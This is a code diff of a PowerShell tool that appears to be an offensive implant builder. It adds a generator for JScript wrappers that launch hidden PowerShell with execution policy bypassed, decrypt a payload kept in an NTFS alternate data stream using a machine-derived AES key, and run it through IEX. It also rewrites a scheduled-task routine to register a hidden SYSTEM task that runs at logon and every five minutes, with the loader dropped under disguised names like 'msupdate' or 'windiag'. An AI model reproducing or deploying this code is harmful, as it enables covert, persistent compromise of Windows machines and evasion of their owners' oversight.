@@ -678,18 +678,102 @@ IEX `$p
     }
 }
 
+function Build-JScriptWrapper {
+    <#
+    .SYNOPSIS
+        Generates JScript source that launches PowerShell completely hidden.
+
+    .PARAMETER ADSFullPath
+        Full ADS path including stream, e.g. "C:\ProgramData\file.dat:stream"
+
+    .PARAMETER IsEncrypted
+        Embeds Get-HostKey + Dec decryption functions inline.
+
+    .OUTPUTS
+        [string]  JScript source code, ASCII-safe.
+    #>
+    [CmdletBinding()]
+    [OutputType([string])]
+    param(
+        [Parameter(Mandatory)]
+        [string]$ADSFullPath,
+
+        [switch]$IsEncrypted
+    )
+
+    # Escape backslashes for JScript string context.
+    # In .NET:  -replace '\\' matches literal \, replacement '\\' is literal \\.
+    # Result: C:\Path -> C:\\Path  (correct for JScript string literals).
+    $jsPath = $ADSFullPath -replace '\\', '\\'
+
+    if ($IsEncrypted) {
+        # --- Literal here-string: zero PowerShell expansion. ---
+        # Every $ passes through verbatim into the JScript output,
+        # which is exactly what we need because PowerShell interprets
+        # them at Layer 4 (when the -Command string executes).
+        #
+        # The pipe character | is encoded as [char]124 in the -join
+        # to sidestep any edge-case shell interpretation.  The rest
+        # of the decryption logic is the same Get-HostKey / Dec pair
+        # used everywhere else, flattened to single-line form.
+        $template = @'
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
+    "function Get-HostKey{" +
+        "$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
+        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))" +
+    "};" +
+    "function Dec($d,$k){" +
+        "$b=[Convert]::FromBase64String($d);" +
+        "$a=[Security.Cryptography.Aes]::Create();" +
+        "$a.Key=$k;$a.IV=$b[0..15];" +
+        "$c=$a.CreateDecryptor();" +
+        "$t=$b[16..($b.Length-1)];" +
+        "$p=$c.TransformFinalBlock($t,0,$t.Length);" +
+        "[Text.Encoding]::UTF8.GetString($p)" +
+    "};" +
+    "$k=Get-HostKey;" +
+    "$e=Get-Content '__ADSPATH__' -Raw;" +
+    "$p=Dec $e $k;" +
+    "IEX $p" +
+    "\"";
+shell.Run(cmd, 0, false);
+'@
+        return $template.Replace('__ADSPATH__', $jsPath)
+    }
+    else {
+        $template = @'
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
+    "IEX(Get-Content '__ADSPATH__' -Raw)" +
+    "\"";
+shell.Run(cmd, 0, false);
+'@
+        return $template.Replace('__ADSPATH__', $jsPath)
+    }
+}
+
 function Create-ScheduledTaskPersistence {
     <#
     .SYNOPSIS
-        Creates scheduled task for persistence
+        Creates a scheduled task that executes via a JScript wrapper
+        to guarantee zero visible windows.
     #>
     [CmdletBinding()]
     param(
-        [string]$LoaderScript,
-        [string]$TaskName
+        [Parameter(Mandatory)]
+        [string]$HostPath,
+
+        [Parameter(Mandatory)]
+        [string]$StreamName,
+
+        [string]$TaskName,
+
+        [switch]$IsEncrypted
     )
 
     try {
+        # --- Task name ---
         if ([string]::IsNullOrEmpty($TaskName)) {
             $TaskName = if ($Randomize) {
                 "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
@@ -698,21 +782,67 @@ function Create-ScheduledTaskPersistence {
             }
         }
 
-        # Save loader to temp
-        $loaderPath = "$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8)).ps1"
-        $LoaderScript | Out-File -FilePath $loaderPath -Encoding UTF8
+        # --- Generate JScript wrapper ---
+        $adsFullPath = "${HostPath}:${StreamName}"
+        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted
 
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
-            -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$loaderPath`""
-        
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
-        
-        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        
-        Write-Verbose "Scheduled task created: $TaskName"
-        return $TaskName
-    } catch {
+        # --- Choose save location (co-locate with host file) ---
+        $hostDir = Split-Path $HostPath -Parent
+        if (-not $hostDir -or -not (Test-Path $hostDir)) {
+            $hostDir = $env:ProgramData
+        }
+
+        $jsFileName = if ($Randomize) {
+            $prefixes = @('msupdate','windiag','perfmon_report','etw_session','wer_diag','mrt_scan')
+            $prefix  = $prefixes | Get-Random
+            $suffix  = -join ((48..57) + (97..102) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
+            "${prefix}_${suffix}.js"
+        } else {
+            "syshealth_check.js"
+        }
+
+        $jsPath = Join-Path $hostDir $jsFileName
+
+        # --- Write to disk (ASCII — wscript chokes on UTF-8 BOM) ---
+        $jsContent | Out-File -FilePath $jsPath -Encoding ASCII -Force
+        Write-Verbose "JScript wrapper saved: $jsPath"
+
+        # --- Task action: wscript.exe //B //E:JScript "wrapper.js" ---
+        $action = New-ScheduledTaskAction -Execute "wscript.exe" `
+            -Argument "//B //E:JScript `"$jsPath`""
+
+        # --- Dual triggers (logon + periodic) ---
+        $triggerLogon    = New-ScheduledTaskTrigger -AtLogOn
+        $triggerPeriodic = New-ScheduledTaskTrigger -Once `
+            -At (Get-Date).AddMinutes(1) `
+            -RepetitionInterval (New-TimeSpan -Minutes 5) `
+            -RepetitionDuration (New-TimeSpan -Days 9999)
+
+        $settings = New-ScheduledTaskSettingsSet `
+            -AllowStartIfOnBatteries `
+            -DontStopIfGoingOnBatteries `
+            -Hidden
+
+        $principal = New-ScheduledTaskPrincipal `
+            -UserId "SYSTEM" `
+            -LogonType ServiceAccount `
+            -RunLevel Highest
+
+        Register-ScheduledTask -TaskName $TaskName `
+            -Action $action `
+            -Trigger @($triggerLogon, $triggerPeriodic) `
+            -Settings $settings `
+            -Principal $principal `
+            -Force | Out-Null
+
+        Write-Verbose "Scheduled task created: $TaskName (wscript //B)"
+
+        return @{
+            TaskName          = $TaskName
+            JScriptLoaderPath = $jsPath
+        }
+    }
+    catch {
         Write-Error "Task creation failed: $_"
         return $null
     }
@@ -804,16 +934,27 @@ if (-not $adsPath) {
 
 # Create persistence
 if ($Persist -ne 'none') {
-    $loader = Build-Loader -HostPath $config.HostPath `
-                          -StreamName $config.StreamName `
-                          -IsEncrypted:$Encrypt
-
     switch ($Persist) {
         'task' {
-            $taskName = Create-ScheduledTaskPersistence -LoaderScript $loader -TaskName $taskName
-            Write-Host "[+] Persistence: Scheduled Task '$taskName'" -ForegroundColor Green
+            $taskResult = Create-ScheduledTaskPersistence `
+                -HostPath $config.HostPath `
+                -StreamName $config.StreamName `
+                -TaskName $taskName `
+                -IsEncrypted:$Encrypt
+
+            if ($taskResult) {
+                $taskName     = $taskResult.TaskName
+                $jsLoaderPath = $taskResult.JScriptLoaderPath
+                Write-Host "[+] Persistence: Scheduled Task '$taskName' (JScript wrapper)" -ForegroundColor Green
+                Write-Host "[+] JScript loader: $jsLoaderPath" -ForegroundColor Green
+            } else {
+                Write-Error "Failed to create scheduled task persistence"
+            }
         }
         'registry' {
+            $loader = Build-Loader -HostPath $config.HostPath `
+                                  -StreamName $config.StreamName `
+                                  -IsEncrypted:$Encrypt
             Write-Warning "Registry persistence not implemented in this version"
         }
         'wmi' {
@@ -824,13 +965,22 @@ if ($Persist -ne 'none') {
 
 # Save manifest (Linux only - not on Windows target)
 if ($ManifestPath) {
-    $payloadHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
-    
+    $payloadHash = (Get-FileHash -InputStream (
+        [System.IO.MemoryStream]::new(
+            [System.Text.Encoding]::UTF8.GetBytes($Payload)
+        )) -Algorithm SHA256).Hash
+
     $entry = Create-ManifestEntry -TargetHost $env:COMPUTERNAME `
                                   -FilePath $config.HostPath `
                                   -StreamName $config.StreamName `
                                   -PayloadHash $payloadHash `
                                   -PersistenceMethod $Persist
+
+    # Append JScript path for cleanup tracking
+    if ($jsLoaderPath) {
+        $entry | Add-Member -NotePropertyName 'JScriptLoaderPath' `
+                            -NotePropertyValue $jsLoaderPath
+    }
 
     Save-ManifestToLinux -Entries @($entry) -OutputPath $ManifestPath
     Write-Host "[+] Manifest saved: $ManifestPath" -ForegroundColor Green
